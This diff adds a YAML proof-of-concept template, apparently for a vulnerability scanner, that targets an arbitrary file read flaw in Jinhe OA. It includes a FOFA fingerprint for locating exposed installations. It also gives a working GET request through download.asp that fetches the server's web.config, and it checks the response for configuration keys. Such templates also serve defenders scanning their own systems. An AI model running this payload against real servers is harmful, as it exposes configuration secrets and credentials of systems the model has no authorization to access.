@@ -1,0 +1,22 @@
+id: poc-yaml-jin-he-oa-download-jsp-anyfile-read
+info:
+  name: 金和OA download.jsp 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 金和OA 协同办公管理系统
+  fofa: app="金和网络-金和OA"
+requests:
+- method: GET
+  path: /C6/Jhsoft.Web.module/testbill/dj/download.asp?filename=/c6/web.config
+  expression: 'status_code == 200 &&
+
+    contains(headers,"filename=Web.config") &&
+
+    contains(body,"<configuration>") &&
+
+    contains(body,"key=")
+
+    '
+variables: {}
+transport: http
